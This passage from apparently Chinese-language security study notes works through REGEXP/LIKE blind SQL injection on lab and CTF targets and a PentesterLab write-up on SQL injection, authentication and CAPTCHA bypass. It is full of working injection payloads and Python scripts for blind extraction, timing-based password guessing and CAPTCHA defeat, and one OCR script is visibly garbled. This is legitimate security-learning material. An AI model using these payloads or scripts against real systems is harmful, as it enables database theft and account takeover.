完整代码如上，不过我自己在编写完成后，发现从后面开始匹配的方法，有一定几率一次成功。 0x04 REGEXP与LIKE注入 这里质量低下，知识点基本都是照搬的，有的只是自己的思考和实操罢了 REGEXP注入分析 注入原理 REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。 1、基本注入 select (select语句) regexp '正则' 正常的查询语句： select username from users where id=1; （1）正则注入，若匹配则返回1，不匹配返回0 select (select username from users where id=1) regexp '^a'; mysql&gt; select username from users where id=1; +----------+ | username | +----------+ | Dumb | +----------+ 1 row in set (0.11 sec) mysql&gt; select(select username from users where id=1) regexp '^D'; +-----------------------------------------------------+ | (select username from users where id=1) regexp '^D' | +-----------------------------------------------------+ | 1 | +-----------------------------------------------------+ 1 row in set (0.04 sec) mysql&gt; select(select username from users where id=1) regexp '^a'; +-----------------------------------------------------+ | (select username from users where id=1) regexp '^a' | +-----------------------------------------------------+ | 0 | +-----------------------------------------------------+ 1 row in set (0.04 sec) ^表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0 （2）regexp关键字还可以代替where条件里的=号 mysql&gt; select password from users where id=1; +----------+ | password | +----------+ | Dumb | +----------+ 1 row in set (0.05 sec) mysql&gt; select * from users where password regexp '^Du'; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 1 | Dumb | Dumb | | 12 | dhakkan | dumbo | +----+----------+----------+ 2 rows in set (0.04 sec) 使用场景： 过滤了=、in、like ^若被过滤，可使用$来从后往前进行匹配（深有感悟啊~~），常用regexp正则语句： regexp '^[a-z]' #判断一个表的第一个字符串是否在a-z中 regexp '^r' #判断第一个字符串是否为r regexp '^r[a-z]' #判断一个表的第二个字符串是否在a-z中 （3）在联合查询中的使用 1 union select 1,database() regexp '^s',3--+ 上述password处只会显示1或者0，这样就能知道我们的regexp是否匹配成功。 2、REGEXP盲注 在sqli-labs靶场Less-8关进行测试 1.判断数据库长度 ' or (length(database())=8)--+ 正常 2.判断数据库名 ' or database() regexp '^s'--+ 正常 ' or database() regexp 'y$'--+ 正常 表名、字段名、数据内容不再赘述。很明显和普通的布尔盲注差不多，附上大师傅的脚本： import requests import string strs = string.printable url = \"http://x.x.x.x:8001/Less-8/index.php?id=\" database1 = \"' or database() regexp '^{}'--+\" table1 = \"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^{}'--+\" cloumn1 = \"' or (select column_name from information_schema.columns where table_name=\\\"users\\\" and table_schema=database() limit 1,1) regexp '^{}'--+\" data1 = \"' or (select username from users limit 0,1) regexp '^{}'--+\" payload = database1 if __name__ == \"__main__\": name = '' for i in range(1,40): char = '' for j in strs: payloads = payload.format(name+j) urls = url+payloads r = requests.get(urls) if \"You are in\" in r.text: name += j print(j,end='') char = j break if char =='#': break LIKE注入分析 like匹配 百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线_通配符允许匹配任何单个字符。 1、基本注入 1.like 's%'判断第一个字符是否为s 1 union select 1,database() like 's%',3 --+ 2.like 'se%'判断前面两个字符串是否为se 1 union select 1,database() like 'se%',3 --+ 3.like '%se%' 判断是否包含se两个字符串 --不过测试下来发现待测字符的开头一定要为正确的，否则页面一直返回0，也就是无法匹配类似%ecu%这类字符 1 union select 1,database() like '%se%',3 --+ 4.like '_____'判断是否为5个字符 1 union select 1,database() like '_____',3 --+ 5.like 's____' 判断第一个字符是否为s 1 union select 1,database() like 's____',3 --+ 2、LIKE盲注 依旧在sqli-labs靶场Less-8关进行测试 1.判断数据库长度 可用length()函数，也可用_，如： ' or database() like '________'--+ 2.判断数据库名 ' or database() like 's%'--+ 也可用 ' or database() like 's_______'--+ 说明数据库名的第一个字符是s。数据表、字段、数据类似，把REGEXP盲注脚本改一下，于是成了LIKE盲注脚本： import requests import string strs = string.printable url = \"http://x.x.x.x:8001/Less-8/index.php?id=\" database1 = \"' or database() like '{}%'--+\" table1 = \"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%'--+\" cloumn1 = \"' or (select column_name from information_schema.columns where table_name=\\\"users\\\" and table_schema=database() limit 1,1) like '{}%'--+\" data1 = \"' or (select username from users limit 0,1) like '{}%'--+\" payload = database1 if __name__ == \"__main__\": name = '' for i in range(1,40): char = '' for j in strs: payloads = payload.format(name+j) urls = url+payloads r = requests.get(urls) if \"You are in\" in r.text: name += j print(j,end='') char = j break if char =='#': break 3、REGEXP注入实战 BJDCTF 2nd 简单注入 发现提示 这里给出了sql语句 Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend. select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]'; 很明显又是相同的套路，我们进行如下赋值： username=haha\\ password='or 1#' select * from users where username='(haha\\' and password=')or 1#'; #括号只是一个提示作用 简单fuzz一下看一下过滤情况： 过滤的有：select、union、'、=、like等等 但是没过滤regexp 如上图发现页面有变化，接下来进一步测试 发现页面回显不一致，但始终只有这两条信息，这意味着我们需要进行盲注了，直接上脚本，这里我先尝试自己写一番 import requests import string def str2hex(str): result = '' for i in str: result += hex(ord(i)) result = result.replace('0x', '') return '0x' + result strs = string.ascii_letters + string.digits url = \"http://f973c801-88f4-44ee-9a5c-ec1911041314.node4.buuoj.cn:81/\" payload = 'or password regexp binary {}#' headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' } if __name__ == \"__main__\": name = '' for i in range(1,40): for j in strs: passwd = str2hex('^' + name + j) payloads = payload.format(passwd) data = { 'username': 'admin\\\\', 'password': payloads } r = requests.post(url, data=data,headers=headers) if \"BJD needs\" in r.text: name += j print(j,end='') break 成功得到密码，我们登录即可得到flag 0x05 后言 本次对于报错注入的学习有些许深刻，日后会随缘更新补充本文，希望可以对报错注入有一个完全的掌握。 0x06 参考文章 SQL报错注入（下） 如何使用 MySQL exp() 函数进行 Sql 注入 SQL 显错注入 2021-虎符网络安全赛道-hatenum | exp()函数与正则过滤 [HFCTF2021]hatenum REGEXP注入与LIKE注入学习笔记","tags":["基本知识"],"categories":["web知识总结"]},{"title":"PentesterLab刷题记录","path":"/2023/12/14/pentesterlab-xi-lie/","content":"0x01 搭建 文件下载地址：https://pentesterlab.com/exercises/web_for_pentester_II/attachments 下载之后新建虚拟机直接导入iso文件，之后一路默认下一步即可，开启虚拟机后ifconfig查看ip直接访问就行，如果访问不了，则换成桥接模式。 搭建成功的结果： 官方说明： 如果您还没有这样做，请务必查看我们的第一个练习：Web For Pentester。在开始这一项之前，先从它开始，这一点很重要。 如果您感觉真的很舒服，您可以尝试利用这些漏洞，而无需遵循课程。您只需要能够编写小脚本来发送 HTTP 请求，这样您就可以完成所有这些练习 0x02 SQL注入 官方说明： 本节提供了一些常见的 SQL 注入示例，第一个示例是身份验证绕过，其他示例是更传统的 SQL 注入。 Example 1 首页是一个post的传参，我们先测试一下 这里输入1’发现报错，直接显示了查询语句。。。，那我们根据sql语句构造万能密码即可。 SELECT * FROM users WHERE username='' AND password='1' or '1'='1' 构造原因为在sql语法中and优先级高于or，那上述sql语句在处理的时候会先判断username='' AND password='1'很明显为false，接着在判断 username='' AND password='1' or '1'='1'即false or '1'='1' = false or true = true为真。 也就是说如果我们将password赋值为1' or '1'='1将成功绕过，如下图也成功验证。 当然我们也可以利用注释符： 令username=admin' or 1=1#则不需要输入password 附上几个其他师傅的姿势，万变不离其宗 \"or\"=\"a'='a a'or' 1=1-- 'or''=' Example 2 依旧是简单测试，虽然语句与上关一样，但万能密码无效了。于是看了几个wp虽然知道如何通过，但原理有点不清楚。这里有的师傅直接联合注入查询就行了，还有一个是限制了查询结果数，payload如下： 姿势一： admin' or 1=1 limit 1# 或者： 姿势二： 1' order by 3# 接着 1' union select 1,2,3# 这里万能密码无效的原因可能是后台源码只允许查询出一条数据，但如果你使用万能秘密，他是恒真的语句，一定会查询出所有数据的，这里就会有冲突。 Example 3 这里输入1’无法报错了，接着输入1\\成功报错，这里也是懵逼，看了wp才想到单引号被过滤了。这里还是太菜了，不知道如何构造了，学习一下师傅们的姿势 姿势一 尝试去构造及规避： username=\\ password=or 1=1# 这样的话: SELECT * FROM users WHERE username='\\' AND password='or 1=1#' 相当于: SELECT * FROM users WHERE username=('\\' AND password=') or 1=1 #这里括号起提示作用 即: 构造username='x' or 1=1 而后面的内容被#注释了,因此我们成功使该sql为真 实践一下，成功绕过。 姿势二： username=\\&amp;password=||1# 这里与上述姿势一差不多，只不过将or替换为了||。这样的话可以如下变形 username=\\&amp;password=||1=1# username=\\&amp;password=or 1# Example 4 这关到了熟悉的查询环节，这里对username的参数经过测试没有任何过滤，我们常规思路即可，简单步骤这里不赘述了 ?req=username='hacker' union select database(),2,3--+ ?req=username='hacker' union select group_concat(table_name),2,3 from information_schema.tables where table_name='sqlinjection_example4' ?req=username='hacker' union select group_concat(column_name),2,3 from information_schema.columns where table_name='sqlinjection_example4' and table_name='users' 或 ?req=username='hacker' union select group_concat(column_name),2,3 from information_schema.columns where table_name='users' ?req=username='hacker' union select group_concat(id,'--&gt;',password),2,3 from users 另外既然这关有报错信息，那肯定还可以进行报错注入： ?req=username and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 剩下不在赘述 Example 5 这关简单测试了下发现是对limit的值的查询，虽然测试了上关的payload可以使用，但不知为何报错注入不可，之后继续测试发现使用联合注入可以进行报错。。。。 ?limit=4 union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 正常来说这样即可，不过这里不理解的点是order by判断列数不管用，总是报错，估计和sql语法有关。 ?limit=4 union select group_concat(id,'--&gt;',password),2,3 from users 查询一番发现如下： LIMIT和ORDER BY如何组合使用 当同时使用LIMIT和ORDER BY时，应该注意它们是如何组合使用的。 LIMIT和ORDER BY的顺序对结果集有影响。如果在LIMIT之前使用ORDER BY语句，则数据库会先对结果集进行排序，然后放回所需的记录。 例如，下面的查询将返回“employee”表中最高工资的前3个员工： SELECT * FROM employee ORDER BY salary DESC LIMIT 3; 如果先使用LIMIT，再使用ORDER BY，数据库会先返回所需记录，然后对它们进行排序。这可能会导致排序结果不正确。 Example 6 SELECT * FROM users GROUP BY group(可控); sql语句如上，group by会按照后续的字段也就是group关键词进行分组 如上图，这里依旧同example 4的思路即可，也是没任何过滤 Example 7 姿势一： 如上图，sql语句如下 SELECT * FROM users WHERE id(可控) 这里先做了报错注入 ?id=1 union select 1, 2,updatexml(1,concat(0x7e,(SELECT group_concat(id,'--&gt;',password)from users limit 0,1),0x7e),1) 如上述语句，不过这里只展示了如下图一条数据，接着我尝试用limit展示下一个，但无果，页面提示只能显示一个用户。。。。我不理解 这里看了别的师傅的姿势，学习一下： ?id=1 and 1=2 UNION SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(0x5f,database(),0x5f,user(),0x5f,version())))a from information_schema.tables group by a)b 这样也可： ?id=1 UNION SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(0x5f,database(),0x5f,user(),0x5f,version())))a from information_schema.tables group by a)b 这里师傅用的是主键重复报错，不过具体原理我记不太清楚了，写完这个系列会去复习一波的。–疑点：为何select后面要跟个1 但这里我尝试接着爆用户名和秘密，但依旧只能有一条数据。接着又去找几篇wp发现还是可以进行报错注入。。。。 ?id=extractvalue(0x7e,concat(0x7e,(select concat(username,0x7e,password)from users limit 9,1))) 或者 ?id=updatexml(0x7e,concat(0x7e,(select concat(username,0x7e,password)from users limit 9,1)),0x7e) 且这种payload只需要控制limit即可爆出所有数据，接着我又分析了一下最开始的payload与上述的不同点 ?id=updatexml(1,concat(0x7e,(SELECT group_concat(username,'--&gt;',password)from users limit 0,1),0x7e),1) 与 ?id=updatexml(0x7e,concat(0x7e,(select concat(username,0x7e,password)from users limit 9,1)),0x7e) 很明显就是group_concat的原因了，为此我们了解一下这两个函数的区别 concat()函数 功能：将多个字符串连接成一个字符串。 语法：concat(str1, str2,…) 返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。 值得注意的是每次只返回的是一行的数据。–这里的测试就直接拿现成的图了，懒得去手工了。 这里借用sqli-labs的users表演示，我们先看看users表的结构以及都有哪些数据。 可以看到users表中有三个字段，分别为id、username、password。然后一共有13条数据。 使用concat()函数演示一下 可以看到concat()将每一次查询的id和username的值连接到一起形成一个字符串返回了，并且一共返回的是13条记录，但是注意当concat()中有一个参数是null时，返回的都是null group_concat()函数 group_concat()函数是将所有的查询结果拼接成一个字符串返回，不过在不同的字段值之间默认是用逗号隔开的 可以看到返回的值就只有一个值。 像concat()函数那样直接拼接内容，中间没有做隔离，很可能会导致我们无法判断哪些字符是属于哪一个字段的。而group_concat()函数默认是用逗号隔开两行不同查询结果的。当然也支持自己定义隔离的符号。 concat_ws()函数 功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就是concat with separator） 语法：concat_ws(separator, str1, str2, …) 说明：第一个参数就是指定的分隔符。需要注意的是分隔符不能为null，如果为null，则返回结果为null（其他参数哪一个为null也是一样的）。 接下来是这位师傅自己的见解： 在sql注入中，我们要分情况的来使用这三个函数。 一般在注入中因为回显的位置有限，我们就会使用concat函数把不同的字段连起来，但是concat()函数一次返回的只是一行的数据，所以还需要结合limit一起使用，一个一个的遍历查看。 但是遍历查看未免太过于麻烦，这个时候group_concat()函数就体现出优势了。因为它可以把所有的查询结果集中到一起返回。这里值得注意的一点就是group_concat()函数对于返回的字符串长度是有限制的。使用 show variables like 'group_concat_max_len' 查看系统变量对返回字符串的长度限制，一般都是1024个字符长度。 文章地址：group_concat()与concat()以及concat_ws()之间的区别 有了这三个函数的解释我们可以清楚的知道上述我最开始使用的payload的错误，因为group_concat函数最终返回的结果只有一行，而此时我还妄想着limit去显示其他行（但实际就一行）这肯定是荒谬的。故此时我们就需要利用left，substring等函数去将那一行长数据进行回显（但无疑在这种方法似乎有点费劲）。 对此如果我们使用cancat函数，那么我们只需要修改limit即可找到所有数据。 姿势二： 其他师傅呢还使用了盲注，我们先简单测试一下 ?id=1 and if(length(database())=21,sleep(5),1) --+ 接着我们根据页面回显就能判断出，database为21个字符，接着我们可以尝试写脚本或者sqlmap跑，这里我就用sqlmap了，毕竟脚本我不会写（大菜鸡）。。。。 赋个源码：咱也不知道师傅们咋找到源码的。。。。 get \"/users/:id\" do ActiveRecord::Base.establish_connection SQLInjectionExample8.db @user = User.find(params[:id]) if @user begin sql = \"SELECT * FROM users WHERE username='#{@user.username}' \" @res = ActiveRecord::Base.connection.execute(sql).to_a[0] erb :user rescue Exception =&gt; e @message = e.to_s end end end post '/user' do User.create(:username =&gt; params[:user], :password =&gt; Digest::MD5.hexdigest(SEED+params[\"password\"]+SEED)) redirect SQLInjectionExample8.path end Example 8 简单测试几下，不难感觉这是一个二次注入，那我们就要首先创造一个含有恶意sql语句的用户名，接着我们需要找某个接口，这个接口会进行数据库查询用户名的功能，这样才能触发我们的恶意数据。 但这里刚开始只有一个创建用户，我并不能找到其他页面，也是看了wp发现可以dirsearch扫一下目录的，如下图扫到了users目录 不过回过头来我发现，那个左侧的数字可以直接点的。。。。 如上图，我们创建用户5之后，点击访问即可 Example 9 先赋个源码 get '/' do ActiveRecord::Base.establish_connection SQLInjectionExample9.db res = [] if params['username'] &amp;&amp; params['password'] begin sql= \"SET CHARACTER SET 'GBK';\" ActiveRecord::Base.connection.execute(sql) name = ActiveRecord::Base.connection.quote_string(params[:username]) password = Digest::MD5.hexdigest(SEED+ActiveRecord::Base.connection.quote_string(params[:password]+SEED)) sql = \"SELECT * FROM users WHERE username='#{name}'\" sql+= \" AND password='\"+password+\"'\" res = ActiveRecord::Base.connection.execute(sql).to_a rescue Exception =&gt; e @message = e.to_s end end pp res if res.size &gt; 0 erb :index else erb :login end end 查询页面，测试了一下不知道是啥玩意儿（感觉sql-labs白刷了。。。）看了wp发现是有关宽字节注入的 那我们直接payload，不过#需要编码或者直接用–+，原因：url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用（post传参则可以直接#）。 具体也可参考：SQL注入中 #、 --+、 --%20、 %23是什么意思？ ?id=1%df' or 1=1%23 这样我们的单引号就逃逸出来了，我们就可以正常万能密码 这里附一个师傅的脚本，用来检测哪些是可以进行宽字节注入的字符 def sql9(): url = \"http://10.108.40.237/sqlinjection/example9/?username=a%{}%27%20or%201=1%23&amp;password=a&amp;submit=Submit\" for x in xrange(255): char = hex(x)[2:] if len(char) == 1: char = \"0\" + char html = requests.get(url.format(char)) if \"Success\" in html.text: print \"[+] 0x{} works\".format(char) print \"Done\" 0x03 Authentication-认证 官方说明： 本节汇总了身份验证页面中的问题示例：从微不足道的暴力破解到更复杂的问题。 Example 1 进入页面是一个js的登录框，刷题多了就很熟悉，估计这里会有一个Authentication头其中会包含你在上述输入框中输入的用户名和密码，并且是经过base64加密的 在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。 因此我们可以在输入之后通过bp抓一下，进行爆破即可 由上图可得，这里我们可以进行爆破，不过毕竟这里是第一关，我们或许可以尝试弱口令 果不其然，这里admin，admin即可登录 Example 2 第二关没那么幸运，并不是弱口令，不过这里提示我们username是hacker，我们只需要爆破password即可，这里肯定是需要运气成分了，如果你的字典够强大，那肯定可以跑出来。不过这毕竟是第二关，估计不会如此考运气。因此我们看一下wp如何写 官方是这样说的： This example is an exagerated version of a non-time-constant string comparison vulnerability. If you compare two strings and stop at the first invalid character, a string A with the first 6 characters in common with the string B will take more time to compare than a string A’ with only the first 2 characters in common with the string B. You can use this information to brute force the password in this example. 译文： 这个例子是一个非时间常数字符串比较漏洞的夸张版本。如果比较两个字符串并在第一个无效字符处停止，与字符串B相同的前6个字符的字符串a比与字符串B只有前2个字符的字符串a需要更多的时间进行比较。 意思就是如果我们的真正密码是password 此时如果我们拿pahahahah和passwoxxx与上述正确密码进行比较的话，那么肯定passwoxxx比较的时间更长（因为pahhh在第三个字符开始就不匹配了，而passwoxxx会持续匹配），因此我们可以根据比较时间长短来逐位爆破密码： authentication是逐位比较的，所以正确的为一位位比较下去，这样就会花更长的时间，那么就可以写脚本跑了，不过不会写，这里我就跟着大师傅们学着写： import requests import time import string from requests.auth import HTTPBasicAuth def auth2(): url = \"http://192.168.123.41/authentication/example2/\" base_time = None password = \"\" passwords = string.ascii_letters + string.digits while True: tmp_start = time.time() html = requests.get(url, auth=HTTPBasicAuth(\"hacker\", password + \"a\")) base_time = time.time() - tmp_start for pwd in passwords: start = time.time() html = requests.get(url, auth=HTTPBasicAuth(\"hacker\", 'p4ssw0r' + pwd)) used_time = time.time() - start print(\"hacker:{0} -&gt; {1}\".format('p4ssw0r' + pwd, used_time)) if html.status_code == 200: print(\"[*] FIND PASSWORD: {}\".format(password + pwd)) return if used_time - base_time &gt; 0.1: password += pwd print(\"[+] password: {} ..\".format(password)) break elif base_time - used_time &gt; 0.1: password += \"a\" print(\"[+] password: {} ..\".format(password)) break print(\"Use Time: {}, password:{}\".format(time.time()-start, password + pwd)) auth2() 上述脚本根本爆破不出来，因此一位一位的比较成功的概率是高的。 import requests import time import string from requests.auth import HTTPBasicAuth def auth2(): url = \"http://192.168.123.41/authentication/example2/\" base_time = None password = \"\" passwords = string.ascii_letters + string.digits for pwd in passwords: start = time.time() html = requests.get(url, auth=HTTPBasicAuth(\"hacker\", 'p4ssw0r' + pwd)) used_time = time.time() - start print(\"hacker:{0} -&gt; {1}\".format('p4ssw0r' + pwd, used_time)) 这里测试了半天，发现总是爆破不出来，之后选择看看每一位爆破的时间，如上图，发现这种方法不稳定，时间差不好确定，只能把每一次爆破的时间都拿出来进行比较才更可能确定密码。（而且爆破第一位p的时间明显还低于其他字符。。。）只能说这可能是我靶场的问题吧，不过我们学一个思路也是好的。 总的来说误差挺大的。。。。最终密码为：p4ssw0rd 我看着其他师傅的脚本也基本没效果了现在。 但当我输入hacker与上述密码之后，没有登陆成功。。。。真的不理解了，不过等了半天的bp爆破成功了 密码的确没问题，后续又试了试登录成功了。。。。 Example 3 根据提示我们先以user1的身份登陆一下，且bp抓包 可以看到cookie字段中含有user=user1的内容，那基本上就是修改这里了，我们直接将user1修改为admin即可，但同时也要主意将上述的?后面的get传参的内容除去，不然这是会冲突的 Example 4 相同的问题 与上关类似，不过这里修改为了md5加密，那我们将admin加密即可 Example 5 这一关我首先进行了注测，并抓取了对应的数据包，如下图，我们可以看到其中有rack.session的字段，我以为这里需要找到key去伪造这个session，但我不知道去哪找，于是陷入了困境，接着看了wp发现利用的MySQL对数据大小写不敏感的特性？？？ 官方这样说道 此示例显示了不同字符串比较方法的结果。创建用户时，应用程序将以编程方式通过将提供的用户名与现有用户进行比较来检查该用户是否不存在。当您登录时，应用程序将检查您的用户名和密码是否正确，然后将您的用户名保存在您的会话中。最后，每次您访问应用程序时，应用程序都会根据会话中提供的用户名检索用户的详细信息。 The trick here comes from the fact that the comparison when you create a user is done programmatically (i.e.: in Ruby) but when the user's details get retrieved, the comparison is done by the database. By default, MySQL (with the type VARCHAR) will perform a case insensitive comparison: \"admin\" and \"Admin\" are the same value. 这里的技巧来自于这样一个事实：创建用户时的比较是以编程方式完成的（即：在 Ruby 中），但是当检索用户的详细信息时，比较是由数据库完成的。默认情况下，MySQL（类型为 VARCHAR ）将执行不区分大小写的比较：“admin”和“Admin”是相同的值。 这样说的话，我们直接注册Admin即可了，这样在注册的时候是由编程语言完成比较的，很明显admin！=Admin，但在后续登录时，MySQL不区分大小写，会将Admin认为是admin。–不得不说很神奇 这样我们直接以admin：123456登录即可，但最后仍然显示Admin，这点不理解 Example 6 为了修复之前的问题，开发人员决定在用户创建过程中使用区分大小写的比较。根据 MySQL 执行字符串比较的方式，也可以绕过此检查：MySQL 忽略尾随空格（即： pentesterlab 和 pentesterlab 相等）。使用与上面相同的方法，您应该能够假装以用户 admin 身份登录。 那我们直接注册admin 即可注意这里有空格，接着我们用admin用户以及我们设置的密码登录即可 防止此问题的一个好方法是告诉数据库用户名是主键。例如，Tomcat 文档中使用此方法将 SQL 后端用作 Realm。 0x04 Captcha-验证码 官方说明： 在攻击验证码时，在开始一些硬核编码之前，请确保不存在逻辑缺陷或某种可预测性。如果您可以在不破坏验证码的情况下绕过它…请不要破坏它！ 关注细节是发现验证码逻辑缺陷的关键。当您需要破解验证码时，请确保检查响应的每个细节。 第一个示例是开发不良的验证码，具有常见的逻辑缺陷，后面的示例更容易破解并且可以破解。 在以下所有示例中，目标是围绕验证码构建自动化，并实现高成功率（大多数情况下为 100%）。 Example 1 映入眼帘的是一个验证码页面，这里的意思估计是要绕过验证码吧？我们看官方提示 此脚本是验证码实施不当的常见问题。为了避免出现错误消息，开发人员在确保其值正确之前先检查验证码参数是否存在： if params[:captcha] and params[:captcha] != session[:captcha] # ERROR: CAPTCHA is invalid redirect [...] end # CAPTCHA is valid [...] 但是，此示例存在一个漏洞：如果未提供验证码，则脚本不会安全失败。 这里看代码就知道，如果我们没有提供captcha参数的话，他就不会进行后续是否正确的判断了，这意味着如果我们删除这个参数，我们直接就可以进入后台而不必输入验证码 当我们先输入验证码抓包后： 如上图，其中包含captcha参数，那我们像下图一样，将该参数删掉看看 如上图，成功绕过 Example 2 仍然是验证码页面，习惯的我直接查看页面源代码，结果有新奇的发现 对应的验证码图片下，有一个隐藏的表单，其中含有的value似乎就是验证码的内容，我们直接复制登录即可，但不清楚是否这样做是正解，我们看一下官方说明 在此示例中，答案由应用程序泄露。通过检查返回的 HTML 页面的源代码，您应该能够编写一个可以自动破解此验证码的脚本。 似乎经过这样的解释我明白了：如果我们找到一个web页面，其中要求你登录，但同时有着验证码的限制导致我们在爆破用户名和密码时会有一定的阻力，此时由于每次刷新验证码的时候，都会在html中显示，这意味着我们可以在爆破的时候，同时抓取html的验证码元素，这样相当于无阻力无限制的爆破用户名和密码了。 Example 3 不过这一关查看源代码会发现什么也没有，但我们继续检查会发现，在cookie处会暴露我们的captcha验证码 官方说明：您还可以使用 JavaScript 控制台从 cookie 中检索验证码并调用 document.cookie ： Example 4 这关开始没搞懂啥意思，我们看官方说明： 这是一个非常有趣的例子，因为这是我在开发这套练习时犯的一个错误。 在这里，您不必真正破解验证码。您只需要破解一次，就可以重复使用相同的值和会话 ID 来一次又一次地执行相同的请求。当您尝试破解验证码时，请确保答案只能使用一次。您可以通过编写一个采用会话 ID 和参数值的脚本来轻松地编写此漏洞利用脚本，然后一次又一次地提交它们。 这意味着我们只需要得知一次正确的验证码，并且在后续我们可以重复提交该验证码，而不必担心该验证码失效的情况，这意味着我们又可以无限制的爆破响应的用户名和密码了 这两个时间点下都是成功的！ 附上一个大佬写的脚本： import requests def captcha4(): url = \"http://192.168.123.41/captcha/example4/submit?captcha=kernel&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\" header = { \"Cookie\" : (\"rack.session=114cbd0bbb0b1a7a0758e3566dd975729b7b08f3cc3d86728206e60beacd3dc4\"), \"Referer\" : \"http://192.168.123.41/captcha/example4/\" } ss = requests.session() while True: html = ss.get(url, headers=header) print(\"html.code: {}\".format(html.status_code)) if \"Success\" in html.text: print(\"[*] Done\") break else: print(\"[-] Error\") captcha4() 不过我认为是有问题的 Example 5 这里虽然没有思路，但在测试的时候发现，你不断的刷新页面，会发现页面回显的验证码是有重复的。但经验少的我并不清楚这有什么弱点，我们继续看官方说明 这个例子是弱点的最后一个例子，这里的弱点来自用于创建验证码的字典； 仅使用有限数量的单词。您可以通过生成所有单词和图像的 MD5 的列表来轻松编写破解程序。然后，当您想要提交表单时，您只需检索图像，计算其 MD5 并提交匹配的单词即可。 这意思是我们可以把这些验证码都保存下来，然后每次用验证码与保存下来的做对比。就可以搞定。 0dayz nacher compromise pentester security vulnerablity admin 不过我还是不能理解这种漏洞的利用之处，毕竟是需要爆破的，但这似乎也是有一定利用点的，只不过我们每次需要尝试的次数变多了吧 在附上一个师傅写的脚本，这里我看不太懂。。。懒得读了 def captcha5(): url = \"http://192.168.60.114/captcha/example5/\" post_url = \"http://192.168.60.114/captcha/example5/submit?captcha={}&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\" # base_url = \"http://10.108.40.237/\" ss = requests.session() captcha = {} # get pic md5 dirs,folder,files = os.walk(\"./pic/\").next() for fi in files: if fi.endswith(\"png\"): path = os.path.join(dirs, fi) with open(path, \"rb\") as f: md5 = hashlib.md5(f.read()).hexdigest() print fi, fi[0: -4] captcha[md5] = fi[0: -4] # get pic html = ss.get(url) # print html.text # print html.content soup = BeautifulSoup(html.text, \"html.parser\") src = soup.select(\"img\")[0][\"src\"] print src img_data = ss.get(url + src).content print \"[+] img_url: {}\".format(url + src) with open(\"pic.png\", \"wb\") as f: f.write(img_data) with open(\"pic.png\", \"rb\") as f: img_md5 = hashlib.md5(f.read()).hexdigest() if img_md5 in captcha: html = ss.get(post_url.format(captcha[img_md5])) print \"img_content: {}\".format(captcha[img_md5]) print \"post_url: {}\".format(post_url.format(captcha[img_md5])) # print html.text if \"Success\" in html.text: print \"[+] Successful..\" else: print \"[-] Somethine Wrong\" Example 6 感觉这题就上难度了，看官方说明我都整不明白，他是这样说的 在这个例子中，我们将使用 OCR 工具（Tesseract）来破解这个简单的验证码。这里的目标是构建一个获得高成功率的脚本。 只需使用 tesseract 的基本脚本，您的成功率就可以达到 95% 以上。您将需要使用以下算法： 1.转到主页 http://vulnerable/captcha/example6/ 获取新的验证码和 cookie ( rack.session )。 2.检索图像， 3.在图像上运行 tesseract 并检索结果。 4.使用正确的 cookie 提交结果。 以下几点可以提高你的成功率： 1.仅当它是单词时才提交值。 2.仅当值仅包含小写字符时才提交该值。 根据应用程序工作流程，您可能希望获得非常高的成功率。例如，如果您花费 10 分钟填写表格，您希望确保验证码破解程序具有较高的成功率。如果只是为了利用 SQL 注入，您可以重试，直到找到正确的值，并且不需要非常准确。 仔细思考似乎懂了他表达的意思，首先我们看一下这关 如上图，可以看到这关给出的验证码是非常清晰的，也就是易识别。倘若此时该网站存在某些漏洞比如SQL注入，但我们在注入的时候每次都需要手工输入正确的验证码，这无疑增加了我们的阻力。但我们可以通过写自动化脚本来完成。此时由于该网站的验证码易抓取，那我们完全可以每次注入的时候爬取页面的验证码，这便大大减少了我们注入的阻力。 这里尝试了半天发现看不懂脚本，也不会修改脚本，看他们都Python版本都对不上。。。这里就先附上吧 脚本一： import pytesseract from PIL import Image import requests import re def main(): url = \"http://192.168.0.104/captcha/example6/\" rs = requests.session() r = rs.get(url) html = r.text img_url = re.findall('img src=\"(.*?)\"/ &gt;',html)[0] img_content = rs.get(url+img_url).content with open(\"test.png\", \"wb\") as f: f.write(img_content) image = Image.open(\"test.png\") text = pytesseract.image_to_string(image) # 使用简体中文解析图片 check_url = \"http://192.168.0.104/captcha/example6/submit?captcha=\"+text+\"img src=\"(.*?)\"/ &gt;', html)[0] img_content = rs.get(url + img_url).content with open(\"test.png\", \"wb\") as f: f.write(img_content) im = Image.open('test.png') im = im.convert('RGBA') pixdata = im.load() for y in range(im.size[1]): for x in range(im.size[0]): if pixdata[x, y][0] == 65 : pixdata[x, y] = (255, 255, 255, 255) #im.show() im.save('test1.png') image = Image.open(\"test1.png\") text = pytesseract.image_to_string(image) # 使用简体中文解析图片 print(text) # check_url = \"http://192.168.0.104/captcha/example7/submit?captcha=\"+text+\"!--注释掉查询的结尾。 脚本二： def captcha67(): url = \"http://10.108.40.237/captcha/example8/\" login_url = \"http://10.108.40.237/captcha/example8/submit?captcha={}&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2\" ss = requests.session() html = ss.get(url).text soup = BeautifulSoup(html, \"html.parser\") pic_src = soup.select(\"img\")[0][\"src\"] img_data = ss.get(url 